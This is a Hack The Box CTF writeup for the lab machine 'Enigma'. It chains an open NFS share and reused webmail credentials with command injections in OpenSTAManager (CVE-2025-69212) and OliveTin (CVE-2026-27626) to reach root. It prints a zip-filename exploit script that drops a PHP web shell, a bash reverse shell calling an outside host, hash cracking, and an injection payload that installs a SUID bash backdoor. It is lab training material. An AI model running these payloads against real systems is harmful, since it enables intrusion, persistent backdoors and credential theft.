---
title: "Hack-The-Box : 'Enigma'  Machine writeup # Season_11"
date: 2026-08-05 13:22:00 +0000
categories: [Writeups, Linux]
tags: [Linux, penetration-testing, penetration-CTF, privilege-escalation, linux, CTF ]
description: "An easy machine from the Season 11 from hack the box"
image:
  path: /assets/images/writeups/Linux/Enigma/Enigma-logo.png
  alt: ""
---

# Machine Overview 
Enigma is an easy machine from the HacktheBox Season 11 that chains an anonymous NFS export, mailbox credential reuse, and two application-level command injections into a full root compromise. Enumeration reveals an unauthenticated NFS share /srv/nfs/onboarding containing New_Employee_Access.pdf, which leaks the webmail credentials kevin:Enigma2024!; reading Kevin's inbox exposes a colleague who reuses the same temporary onboarding password, and Sarah's mailbox in turn discloses the internal subdomain support_001.enigma.htb with admin:Ne3s4rtars78s. That panel runs a vulnerable OpenSTAManager instance affected by CVE-2025-69212, an OS command injection in P7M file processing: a crafted archive whose entry filename breaks out of the shell context drops SHELL.php and yields code execution as www-data, which is upgraded to a reverse shell. The application's config.inc.php provides local database credentials, and dumping the zz_users table exposes a bcrypt hash for haris that cracks to bestfriends, enabling a lateral pivot to the user account. Privilege escalation targets a root-owned OliveTin 3000.10.0 service bound to 127.0.0.1:1337 with authRequireGuestsToLogin: false; via CVE-2026-27626, the single-quoted db_pass argument of the "Backup Database" mysqldump operation is abused for shell injection (x' ; ; #), and calling the StartActionAndWait API to install a SUID /bin/bash grants a root shell. 


# Enumeration 
we start with a simple nmap scan on the target machine ip address and trying to identify all the opened ports 

```bash

nmap -p- 10.129.239.191
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-08 13:43 EDT
Nmap scan report for 10.129.239.191
Host is up (0.0088s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
43549/tcp open  unknown
43787/tcp open  unknown
53303/tcp open  unknown
54343/tcp open  unknown
57007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 5.54 seconds

```
after we identified the opened ports we need to dig deeper in the services running for each port 


```bash

nmap -p22,80,110,111,143,993,995,2049 -sCV 10.129.239.191 

Nmap scan report for 10.129.239.191
Host is up (0.0077s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE TOP SASL STLS CAPA PIPELINING UIDL RESP-CODES
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34752/udp6  mountd
|   100005  1,2,3      44715/tcp6  mountd
|   100005  1,2,3      54343/tcp   mountd
|   100005  1,2,3      55912/udp   mountd
|   100021  1,3,4      41521/tcp6  nlockmgr
|   100021  1,3,4      43787/tcp   nlockmgr
|   100021  1,3,4      48904/udp6  nlockmgr
|   100021  1,3,4      60370/udp   nlockmgr
|   100024  1          37617/tcp6  status
|   100024  1          43049/udp6  status
|   100024  1          56543/udp   status
|   100024  1          57007/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: post-login listed LOGIN-REFERRALS capabilities IDLE IMAP4rev1 STARTTLS LOGINDISABLEDA0001 have ENABLE OK Pre-login more SASL-IR ID LITERAL+
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: post-login listed capabilities AUTH=PLAINA0001 IMAP4rev1 IDLE have LOGIN-REFERRALS ENABLE OK Pre-login more SASL-IR ID LITERAL+
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: USER TOP SASL(PLAIN) AUTH-RESP-CODE CAPA PIPELINING UIDL RESP-CODES
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds

```

we can see there is a web service running in the port 80 with the domain `http://enigma.htb/`, we add this domain to our /etc/host file 

```bash

echo '10.129.239.191 enigma.htb' | sudo tee -a /etc/hosts

10.129.239.191 enigma.htb


```
now we access this domain and we see a web page, playing around with the site we got nothing can be exploited and same case with fuzzing web content , now we move to subdomain enumeration using the powerful tool `ffuf` 

```bash
ffuf -u http://enigma.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enigma.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://enigma.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.enigma.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mail001                 [Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 430ms]


```
as we can see from the ffuf output there is an active subdomain `mail001` that worth investigation ,by adding this subdomain to our /etc/hosts file ( same process as the previous one ) and accessing this reveal to us a login panel of a Webmail software called roundCube,  now we need to get the credentials.

from the nmap output we know that there is `NFS` service opened for us ,we can give it a try and mount it and see what is inside 

```bash
showmount -e 10.129.107.249
Export list for 10.129.107.249:
/srv/nfs/onboarding *

```
That * means no IP restriction, anyone can mount it. now run the following commands to mount the shared network folder onto your local computer

```bash
# Remote NFS export 
NFS="10.129.107.249:/srv/nfs/onboarding"

# Create a local mount point for the exported share
sudo mkdir -p /mnt/target-nfs

# Mount the NFS share locally
sudo mount -t nfs "$NFS" /mnt/target-nfs -o nolock

# Browse the mounted share.
ls -la /mnt/target-nfs


```

there is a readable pdf file and by reading it we get the credentials to use for logging to the webmail ( they don't work with ssh )

now we are inside the webmail page the first thing to do it get the version of this software and see if it has any vulnerability on it from the public exploits , but nothing there , when i was playing around i found a mail from sarah (which seems our next target) , trying to login to the webmail using username `sarah` and the default password `Enigma2024!` and it worked, we are in . 
after browsing in sarah's sendbox we can find an `admin` credentials there for another exposed subdomain  

![ admin credits  ](/assets/images/writeups/Linux/Enigma/admin-credits.png)

adding the subdomain to our hosts file and access it reveal an `OpenSTAManager` login panel   , login with admin credits , and the first step is identifying the version which is `2.9.8`  and by quick google search we see that This OpenSTAManager version is vulnerable to an OS Command Injection in P7M File Processing `CVE-2025-69212`:  https://github.com/advisories/GHSA-25fp-8w8p-mx36

![ OpenSTAManager version  ](/assets/images/writeups/Linux/Enigma/version.png)


by following the POC steps to exploit the vulnerability   
```bash

Step 1 create the malicious zip

import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")


```

then upload the zip file and then it should return an error

![ Exploiting the vulnerability  ](/assets/images/writeups/Linux/Enigma/exploitation-error.png)

this error fires after our injected filename already ran through exec() so our exploit works , let's confirm that 

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                                                                                         curl "http://support_001.enigma.htb/files/SHELL.php?c=whoami"
www-data
```
now we need to get a reverse-shell from the web server 
first we encode the payload to base64 and decoding it when it reach the server , and also we set a listener in the provided port in the payload from our machine , we send the payload and booom we get a reverse shell

```bash
curl -G "http://support_001.enigma.htb/files/SHELL.php" \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.10.14.26/443 0>&1"'
```

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.107.249] 60626
bash: cannot set terminal process group (1533): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/files$ whoami
whoami
www-data
```
we make the shell stable by typing this commands 
```shell
upgrade to PTY
python3 -c 'import pty;pty.spawn("bash")' or script /dev/null -c bash
^Z
stty raw -echo; fg


```
 after enumerating the system we can get database credits from the `config.inc.php` file in the OpenSTAManager directory

```bash
www-data@enigma:~/html/openstamanager$ cat config.inc.php
cat config.inc.php
<?php

/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
#$db_username = 'brollin';
#$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];

// Tema selezionato per il front-end
$theme = 'default';

// Impostazioni di sicurezza
$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
$disableCSRF = true; // Protezione contro CSRF

// Impostazioni di debug
$debug = false;

$disable_hooks = false;

// Permette di accedere solo con un ip (da utilizzare per manutenzione)
$maintenance_ip = '';

// Personalizzazione dei gestori dei tag personalizzati
$HTMLWrapper = null;
$HTMLHandlers = [];
$HTMLManagers = [];

// Lingua del progetto (per la traduzione e la conversione numerica)
$lang = 'en_GB';
// Personalizzazione della formattazione di timestamp, date e orari
$formatter = [
    'timestamp' => 'd/m/Y H:i',
    'date' => 'd/m/Y',
    'time' => 'H:i',
    'number' => [
        'decimals' => ',',
        'thousands' => '',
    ],
];

// Ulteriori file CSS e JS da includere
$assets = [
    'css' => [],
    'print' => [],
    'js' => [],
];

// Configura il limite di tempo di esecuzione del file cron.php
$php_time_limit = '';
```

Now let's access the database using the credit we found and i d the users table in the `openstamanager` database. I checked the users table and found the password hash for the admin user.

```bash
mysql -u brollin -p'Fri3nds@9099' lhost openstamanager -e "SELECT username, password FROM zz_users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
+----------+--------------------------------------------------------------+
www-data@enigma:~/html/openstamanager$ 
```

i used hashcat to crack the hash password of the admin and haris user

```bash

hashcat harris.hash -m 3200 /usr/share/wordlists/rockyou.txt
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
Time.Started.....: Thu Jul  2 16:58:48 2026 (19 secs)
Time.Estimated...: Thu Jul  2 16:59:07 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       36 H/s (3.34ms) @ Accel:2 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 672/14344385 (0.00%)
Rejected.........: 0/672 (0.00%)
Restore.Point....: 668/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: starwars -> kelly
Hardware.Mon.#01.: Util: 90%

Started: Thu Jul  2 16:58:46 2026
Stopped: Thu Jul  2 16:59:08 2026
```

After cracking the hash, I tried to use SSH to login as the harris user using the cracked password but i get permission denied , then i tried to change my user from www-data to haris using the su command and it worked.

```bash
www-data@enigma:~/html/openstamanager$ su haris
Password: 
haris@enigma:/var/www/html/openstamanager$ whoami
haris
haris@enigma:/var/www/html/openstamanager$ id
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)

```
now we are haris we can capture our user flag 

# Privilege Escalation
next step is elevating our privileges to root user , i checked if the haris user has sudo privileges and it seems he does not, keep looking and i found some process running as root that is owned by haris 

```bash
haris@enigma:~$ ps -ef | grep 1440
root        1440       1  0 17:41 ?        00:00:00 /usr/local/bin/OliveTin
```

we can see that  `OliveTin` is running on port 1337 and now let's take a look at what exist in that port but first we need to forward that port to our local machine.

```bash
haris@enigma:~$ mkdir .ssh
haris@enigma:~$ cd .ssh
haris@enigma:~/.ssh$ echo "YOUR ssh public key" > authorized_keys
haris@enigma:~/.ssh$ chmod 400 authorized_keys 

┌──(bilal)-[~/Templates/htb-labs/Easy/Enigma]
└─$ ssh -i ~/.ssh/id_rsa haris@enigma.htb -L 1337:localhost:1337
Last login: Thu Jul 2 08:17:37 2026 from 10.10.14.26
haris@enigma:~$ 
```
but what is `OliveTin` and why we are interested in it. `OliveTin` is an administration panel that exposes predefined shell commands as web operations, and if the service is running as root, any insecure operation parameters become permission boundaries.
now we access the web page we see `OliveTin 3000.10.0 ` is the version, and there are plenty of vulnerable targets here.

![ accessing OliveTin web page  ](/assets/images/writeups/Linux/Enigma/OliveTin.png)


then Checked the OliveTin yaml file for the configuration and found some interesting things like `authRequireGuestsToLogin` is set to false which means a guest user can do anything without login to `OliveTin` there is also another thing that catches my eyes that can be vulnerable to command injection `CVE-2026-27626` 

```bash
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

We see that the backup operation is run via shell, and the database password is exposed as the password operation parameter, but Before injecting anything, we needed the action’s real API identifier , the dashboard-listing endpoint reveals each action’s bindingId

```bash
curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard \
  -H 'Content-Type: application/json' \
  --data '{}' \
  | jq '.. | objects | select(.title? == "Backup Database") | .action'
{
```

```bash
{
  "bindingId": "backup_database",
  "title": "Backup Database",
  "icon": "⛁",
  "canExec": true,
  "arguments": [
    {
      "name": "db_user",
      "title": "db_user",
      "type": "ascii_identifier",
      "defaultValue": "backup_svc",
      "choices": [],
      "description": "",
      "suggestions": {},
      "suggestionsBrowserKey": ""
    },
    {
      "name": "db_pass",
      "title": "db_pass",
      "type": "password",
      "defaultValue": "",
      "choices": [],
      "description": "",
      "suggestions": {},
      "suggestionsBrowserKey": ""
    },
    {
      "name": "db_name",
      "title": "db_name",
      "type": "ascii_identifier",
      "defaultValue": "production",
      "choices": [],
      "description": "",
      "suggestions": {},
      "suggestionsBrowserKey": ""
    }
  ],
  "popupOnStart": "execution-dialog",
  "order": 23,
  "timeout": 3,
  "datetimeRateLimitExpires": ""
}
```
Once the bindingId is known, it is used as the API actionId. The validation payload is only put into db_pass: it disables the password quotes in -p'{​{db_pass}​}', runs id, and then comments out the rest of the generated command, for more reading how to exploit this : https://github.com/OliveTin/OliveTin/security/advisories/GHSA-49gm-hh7w-wfvf

add this password on the password field in the web page of OliveTin and will run to root user
```bash
db_pass = x' ; id ; #
```

![ getting root from  OliveTin web page ](/assets/images/writeups/Linux/Enigma/OliveTin-root.png)

now to get root shell we saw previously `canExec`: true for an unauthenticated request is the confirmation, this is triggerable without ever logging in. With the bindingId known, the payload drops a setuid copy of bash rather than trying to smuggle an interactive shell through the API directly:

```bash
actionId='backup_database'
cmd="install -m 4755 /bin/bash /tmp/.bs"

cat > /tmp/backdoor.json <<JSON
{
  "actionId": "$actionId",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; $cmd ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
JSON

```

```bash
curl -s -X POST \
  -H 'Content-Type: application/json' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
```

Now we are rooot 

```bash
haris@enigma:~$ /tmp/.bs -p
.bs-5.2# whoami
root
```
